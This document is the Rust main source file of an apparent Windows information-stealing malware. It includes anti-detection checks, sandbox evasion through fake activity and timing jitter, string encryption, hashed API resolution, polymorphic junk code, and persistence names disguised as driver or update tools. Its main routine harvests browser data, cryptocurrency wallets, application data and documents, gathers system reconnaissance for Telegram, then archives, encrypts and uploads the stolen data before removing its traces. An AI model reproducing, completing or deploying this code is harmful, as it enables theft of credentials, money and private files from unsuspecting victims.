#![windows_subsystem = "windows"]
#![feature(optimize_attribute)]
#![feature(asm_experimental_arch)]

mod proc;
mod fun;
mod wallet;
mod app;
mod docs;
mod communications;
mod fingerprint;
mod detection;
mod evasion;
mod cleanup;
mod dissolve;
mod padding;
mod win_internals;
mod api_hash;
mod api_resolve;
mod recon;
mod polymorph;
mod ntbridge;
mod ntcall;
mod system_health;
mod sprotect;

use update::sprotect;
use rand::Rng;
use std::arch::asm;
use communications::blob_format::create_encrypted_blob;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

// Polymorphic persistence names
//#ultraprotect(name="EXE_NAME", value="DisplayDriverUpdater.exe")
lazy_static::lazy_static! {
    pub static ref EXE_NAME: String = sprotect!("SystemDriverUpdate.exe");
}
//#endultra()

//#ultraprotect(name="REG_KEY_PATH", value="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
lazy_static::lazy_static! {
    pub static ref REG_KEY_PATH: String = sprotect!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
}
//#endultra()

//#ultraprotect(name="REG_VALUE_NAME", value="LastTelemetrySync")
lazy_static::lazy_static! {
    pub static ref REG_VALUE_NAME: String = sprotect!("PreviousUpdateScan");
}
//#endultra()

//#ultraprotect(name="BITS_JOB_NAME", value="WindowsUpdateBackup")
lazy_static::lazy_static! {
    pub static ref BITS_JOB_NAME: String = sprotect!("WindowsUpdateBackup");
}
//#endultra()

//#junk(name="process_check_junk")
//#endjunk()

#[cfg(windows)]
fn is_process_running() -> bool {
    use std::process::Command;
    
    //#jcall(name="process_check_junk")
    
    if let Ok(output) = Command::new(sprotect!("tasklist"))
        .creation_flags(0x08000000)
        .output()
    {
        let processes = String::from_utf8_lossy(&output.stdout);
        let exe_name = EXE_NAME.as_str();
        
        //#jcall(name="process_check_junk")
        
        let count = processes.lines()
            .filter(|line| line.contains(&exe_name))
            .count();
        
        return count > 1;
    }
    false
}

//#junk(name="mutex_junk")
//#endjunk()

#[cfg(windows)]
fn ensure_single_instance() -> Option<*mut std::ffi::c_void> {
    use crate::api_resolve::HashedAPIs;
    use winapi::shared::winerror::ERROR_ALREADY_EXISTS;
    use winapi::um::winnt::SYNCHRONIZE;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

//#genuuid()
const UUID: &str = "a0144ced2cd245518eb0f66045d30fc4";

    //#jcall(name="mutex_junk")

    let mutex_name = format!("{}\\{{{}}}", sprotect!("Global"), UUID);
    let wide: Vec<u16> = OsStr::new(&mutex_name).encode_wide().chain(Some(0)).collect();

    unsafe {
        let mutex = HashedAPIs::create_mutex_w(std::ptr::null_mut(), 0, wide.as_ptr());
        
        //#jcall(name="mutex_junk")
        
        if !mutex.is_null() && HashedAPIs::get_last_error() == ERROR_ALREADY_EXISTS {
            if !is_process_running() {
                let existing = HashedAPIs::open_mutex_w(SYNCHRONIZE, 0, wide.as_ptr());
                if !existing.is_null() {
                    HashedAPIs::release_mutex(existing);
                    HashedAPIs::close_handle(existing);
                }
                
                let new_mutex = HashedAPIs::create_mutex_w(std::ptr::null_mut(), 0, wide.as_ptr());
                if !new_mutex.is_null() {
                    return Some(new_mutex);
                }
            }
            return None;
        }
        Some(mutex)
    }
}

#[tokio::main]
async fn main() {
    let temp_dir = std::env::temp_dir();
    let _ = std::env::set_current_dir(temp_dir);

    #[cfg(windows)]
    let _mutex = match ensure_single_instance() {
        Some(m) => m,
        None => return,
    };

    //#jcall(name="mutex_junk")

    detection::exit_if_detected();

    //#jcall(name="process_check_junk")

    std::thread::sleep(std::time::Duration::from_secs(3));

    jitter!(30, 60);

    evasion::random_legitimate_activity().await;

    jitter!(5, 10);

    evasion::random_legitimate_activity().await;

    jitter!(5, 10);

    //#ultraprotect(name="test_ultra", value="SensitiveAPIKey123456")
    //#endultra()
    
    let device_id = match fingerprint::get_or_create_device_id().await {
        Ok(id) => id,
        Err(_) => return,
    };

    let system_recon = recon::SystemRecon::gather();

    let _ = run_harvest_and_upload(&device_id, &system_recon).await;
    
    std::process::exit(0);
}

//#junk(name="harvest_junk")
//#endjunk()

async fn run_harvest_and_upload(device_id: &str, system_recon: &recon::SystemRecon) -> Result<(), Box<dyn std::error::Error>> {
    //#polymorphnop(intensity="light")
    //#stackjunk(vars=3)
    //#jcall(name="harvest_junk")
    
    //#opaqueif()
    match communications::initialize_communications().await {
        Ok(_) => {},
        Err(_) => {},
    }
    //#endopaque()



    //#stackjunk(vars=5)
    //#jcall(name="mutex_junk")

    //#polymorphnop(intensity="heavy")
    //#opaqueif()
    match proc::browser::bmain::collect().await {
        Ok(_) => {},
        Err(_) => {},
    }
    //#endopaque()

    //#jcall(name="harvest_junk")

    //#polymorphnop(intensity="light")
    //#opaqueif()
    match proc::lbrowser::lmain::collect().await {
        Ok(_) => {},
        Err(_) => {},
    }
    //#endopaque()

    //#jcall(name="process_check_junk")

    //#stackjunk(vars=4)
    //#opaqueif()
    match proc::system::resources::collect().await {
        Ok(_) => {},
        Err(_) => {},
    }
    //#endopaque()

    //#jcall(name="harvest_junk")

    match fun::collect().await {
        Ok(_) => {},
        Err(_) => {},
    }

    match wallet::extract_all_wallets().await {
        Ok(_) => {},
        Err(_) => {},
    }

    match app::extract_all_apps().await {
        Ok(_) => {},
        Err(_) => {},
    }

    match docs::extract_all_documents().await {
        Ok(_) => {},
        Err(_) => {},
    }

    let system_name = std::env::var(sprotect!("COMPUTERNAME"))
        .unwrap_or_else(|_| sprotect!("Unknown"));
    let username = std::env::var(sprotect!("USERNAME"))
        .unwrap_or_else(|_| sprotect!("Unknown"));
    let device_short_id = device_id.chars().take(8).collect::<String>();

    jitter!(120, 180);
    
    let extract_dir = sprotect!("C:\\temp\\extract");
    
    let recon_text = system_recon.format_for_telegram();
    let recon_file = format!("{}/{}", extract_dir, sprotect!("SystemInfo.txt"));
    let _ = std::fs::write(&recon_file, recon_text);
    
    let mut upload_success = false;
    
    let blob_result: Result<(Vec<u8>, String), String> = create_encrypted_blob(&extract_dir);
    if let Ok((encrypted_blob, random_filename)) = blob_result {
        if communications::upload_harvest_data(encrypted_blob, &random_filename).await.is_ok() {
            upload_success = true;
        }
    }

    let _ = std::fs::remove_dir_all(&extract_dir);

    if upload_success {
        Ok(())
    } else {
        Err(sprotect!("No data uploaded").into())
    }
}

fn get_folder_size(path: &std::path::Path) -> u64 {
    use walkdir::WalkDir;

    let mut total_size = 0u64;
    for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
        if let Ok(metadata) = entry.metadata() {
            if metadata.is_file() {
                total_size += metadata.len();
            }
        }
    }
    total_size
}

fn collect_directory_archives(dir_path: &str) -> Result<Vec<(Vec<u8>, String)>, std::io::Error> {
    use std::io::Write;
    use walkdir::WalkDir;
    use zip::write::FileOptions;

    const MAX_ARCHIVE_SIZE: usize = 500 * 1024 * 1024;

    if !std::path::Path::new(dir_path).exists() {
        return Err(std::io::Error::new(std::io::ErrorKind::NotFound, sprotect!("Directory not found")));
    }

    let mut all_archives: Vec<(Vec<u8>, String)> = Vec::new();
    let base_path = std::path::Path::new(dir_path);

    if let Ok(entries) = std::fs::read_dir(base_path) {
        for entry in entries.flatten() {
            let folder_path = entry.path();
            if folder_path.is_dir() {
                let default_name = sprotect!("unknown");
                let folder_name = folder_path.file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or(&default_name);

                let folder_size = get_folder_size(&folder_path);

                let zip_result = zip_folder(&folder_path, folder_name, MAX_ARCHIVE_SIZE)?;
                all_archives.extend(zip_result);
            }
        }
    }

    if all_archives.is_empty() {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, sprotect!("No data found")));
    }

    Ok(all_archives)
}

fn zip_folder(folder_path: &std::path::Path, folder_name: &str, max_size: usize) -> Result<Vec<(Vec<u8>, String)>, std::io::Error> {
    use std::io::{Read, Write};
    use walkdir::WalkDir;
    use zip::write::FileOptions;

    let password: String = (0..12).map(|_| {
        let idx = rand::thread_rng().gen_range(0..62);
        sprotect!("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789").as_bytes()[idx] as char
    }).collect();

    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated)
        .compression_level(Some(9));

    let mut archives: Vec<(Vec<u8>, String)> = Vec::new();
    let mut files_to_archive = Vec::new();

    for entry in WalkDir::new(folder_path).into_iter().filter_map(|e| e.ok()) {
        let path = entry.path();
        if path.is_file() {
            let relative_path = path.strip_prefix(folder_path)
                .unwrap_or(path)
                .to_string_lossy()
                .to_string();

            if let Ok(mut file) = std::fs::File::open(path) {
                let mut buffer = Vec::new();
                if let Ok(_) = file.read_to_end(&mut buffer) {
                    files_to_archive.push((relative_path, buffer));
                }
            }
        }
    }

    let mut current_files: Vec<(String, Vec<u8>)> = Vec::new();
    let mut current_size = 0;

    for (path, data) in files_to_archive {
        let estimated_size = data.len() + path.len() + 100;

        if current_size > 0 && current_size + estimated_size > max_size {
            let mut buffer = Vec::new();
            {
                let cursor = std::io::Cursor::new(&mut buffer);
                let mut zip = zip::ZipWriter::new(cursor);

                for (file_path, file_data) in &current_files {
                    let file_name = format!("{}{}{}", folder_name, sprotect!("/"), file_path);
                    zip.start_file(file_name, options)?;
                    zip.write_all(file_data)?;
                }

                zip.finish()?;
            }
            archives.push((buffer, password.clone()));

            current_files.clear();
            current_size = 0;
        }

        current_files.push((path, data));
        current_size += estimated_size;
    }

    if !current_files.is_empty() {
        let mut buffer = Vec::new();
        {
            let cursor = std::io::Cursor::new(&mut buffer);
            let mut zip = zip::ZipWriter::new(cursor);

            for (file_path, file_data) in &current_files {
                let file_name = format!("{}{}{}", folder_name, sprotect!("/"), file_path);
                zip.start_file(file_name, options)?;
                zip.write_all(file_data)?;
            }

            zip.finish()?;
        }
        archives.push((buffer, password.clone()));
    }

    Ok(archives)
}